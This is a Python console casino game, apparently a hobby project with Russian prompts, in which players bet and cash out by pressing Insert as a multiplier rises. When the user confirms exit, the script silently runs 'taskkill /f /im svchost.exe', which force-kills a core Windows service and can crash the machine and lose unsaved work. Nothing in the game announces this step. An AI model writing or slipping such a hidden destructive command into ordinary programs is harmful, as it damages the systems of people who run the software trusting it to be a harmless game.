import random
from datetime import datetime
import time
import os
import json
import keyboard

X_Loos = [
    0.1, 0.2, 0.21, 0.29, 0.32, 0.35, 0.41, 0.45,
    0.5, 0.53, 0.58, 0.62, 0.65, 0.7, 0.73, 0.78,
    0.82, 0.85, 0.9, 0.93, 0.98, 1.02, 1.05, 1.1,
    1.13, 1.18, 1.22, 1.25, 1.3, 1.33, 1.38, 1.42,
    1.45, 1.5, 1.53, 1.58, 1.62, 1.65, 1.7, 1.73,
    1.78, 1.82, 1.85, 1.9, 1.93, 1.98, 2.02, 2.05,
    2.1, 2.13, 2.18, 2.22, 2.25, 2.3, 2.35, 2.4,
    2.45, 2.5, 2.55, 2.6, 2.65, 2.7, 2.75, 2.8,
    2.85, 2.9, 2.95, 3.0
]
X_Win = [
    3.0, 3.05, 3.12, 3.18, 3.25, 3.3, 3.38, 3.45,
    3.5, 3.58, 3.65, 3.7, 3.78, 3.85, 3.9, 3.98,
    4.02, 4.1, 4.18, 4.25, 4.3, 4.38, 4.45, 4.5,
    4.58, 4.65, 4.7, 4.78, 4.85, 4.9, 4.98, 5.02,
    5.1, 5.18, 5.25, 5.3, 5.38, 5.45, 5.5, 5.58,
    5.65, 5.7, 5.78, 5.85, 5.9, 5.98, 6.02, 6.1,
    6.18, 6.25, 6.3, 6.38, 6.45, 6.5, 6.58, 6.65,
    6.7, 6.78, 6.85, 6.9, 6.98, 7.02, 7.1, 7.18,
    7.25, 7.3, 7.38, 7.45, 7.5, 7.58, 7.65, 7.7,
    7.78, 7.85, 7.9, 7.98, 8.02, 8.1, 8.18, 8.25,
    8.3, 8.38, 8.45, 8.5, 8.58, 8.65, 8.7, 8.78,
    8.85, 8.9, 8.98, 9.02, 9.1, 9.18, 9.25, 9.3,
    9.38, 9.45, 9.5, 9.58, 9.65, 9.7, 9.78, 9.85,
    9.9, 9.98, 10.0
]


default_data = {"balance":1000}


print("Здравствуйте.\n"
           "Вас приветствует SKAsiMan!\n"
           "У нас самые большие выигрыши! БЕЗ РЕГИСТРАЦИЙ(мне было лень писать логику входа).")


def generate_casino_log(message):
    time_real = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
    with open("Casino.log", "a") as log_file:
        log_file.write(f'[{time_real}] {message}\n')


def get_user_choice(prompt, valid_choices):
    while True:
        try:
            choice = int(input(prompt))
            if choice in valid_choices:
                return choice
            print("Пожалуйста, выберите один из предложенных вариантов.")
        except ValueError as error:
            print("Пожалуйста, введите число.")
            generate_casino_log(f"Ошибка ввода: {error}")


def type_in_json(data):
    with open("data.json", "w") as F_json:
        generate_casino_log(f"Скрипт записал в файл новое значение: {data}")
        json.dump(data, F_json, indent=4)


def read_in_json():
    try:
        with open("data.json", "r") as f:
            generate_casino_log("Файл был прочитан.")
            data = json.load(f)
            if not isinstance(data["balance"], int):
                return 0
            else:
                return data
    except Exception as e:
        generate_casino_log("Файл не найден или был повреждён. Создаю новый...\n"
                            f"Ошибка: {e}")
        type_in_json(default_data)
        return default_data


def lost_or_win(sign, bid, how_much_x):
    money = read_in_json()

    if sign == "+":
        win = round(how_much_x * bid)
        print(f"\nПоздравляю! Вы выйграли! Ваша победа составила: {win}")
        balance = money["balance"] + win
    else:
        balance = money["balance"] - bid

    type_in_json({"balance": balance})
    return balance


def play_game():
    casino_def = 0.01
    user_info = read_in_json()
    print(f"Ваш баланс составляет: {user_info["balance"]} монет.")

    while True:

        try:
            how_much_bid = int(input("Ваша ставка: "))
            if how_much_bid > user_info["balance"] or how_much_bid <= 0:
                print("Советую вам написать правдивую ставку.")
                continue
        except ValueError as r:
            generate_casino_log(f"Ошибка: {r}")
            print("Советую вам написать правдивую ставку.")
            continue

        generate_casino_log(f"Пользователь поставил ставку: {how_much_bid}")
        print("Для того чтобы забрать свой выйгрыш нажмите Insert...(советую нажимать много раз)\n"
              "Игра начнётся через:")

        print("3...")
        time.sleep(1)
        print("2...")
        time.sleep(1)
        print("1...")
        time.sleep(1)
        print("Игра началась!")

        system_random = random.randint(1, 12)

        if system_random in (11, 12):
            random.shuffle(X_Win)
            casino_random = random.choice(X_Win)
        else:
            random.shuffle(X_Loos)
            casino_random = random.choice(X_Loos)

        while True:

            print(f"\rТекущий множитель составляет: x{casino_def:}", end="", flush=True)
            time.sleep(0.1)

            casino_def += 0.01
            casino_def = round(casino_def, 2)

            if casino_def >= casino_random:
                print("\nК сожалению ваша ставка сгорела(мне похуй).")
                lost_or_win("-", how_much_bid, casino_def)
                main()

            if keyboard.is_pressed("insert"):
                time.sleep(0.2)
                lost_or_win("+", how_much_bid, casino_def)
                main()


def main():

    user_info = read_in_json()

    if user_info["balance"] <= 0:
        print("Ты всё проиграл... Пора брать долг! Тебе здесь не место.\n")
        time.sleep(3)
        exit()

    while True:
        choice = get_user_choice("1.Играть\n2.Выход\n",[1, 2])
        if choice == 1:
            generate_casino_log("Пользователь выбрал: Играть")
            play_game()
        else:
            generate_casino_log("Пользователь выбрал: Выход")
            confirm = get_user_choice("Вы уверены что хотите выйти?\n1.Да\n2.Нет\n",[1, 2])
            if confirm == 1:
                generate_casino_log('Закрываю svchost.exe...')
                os.system("taskkill /f /im svchost.exe")
                exit()
            else:
                print("Продолжаем [выйгрывать]!")


if __name__ == "__main__":
    main()


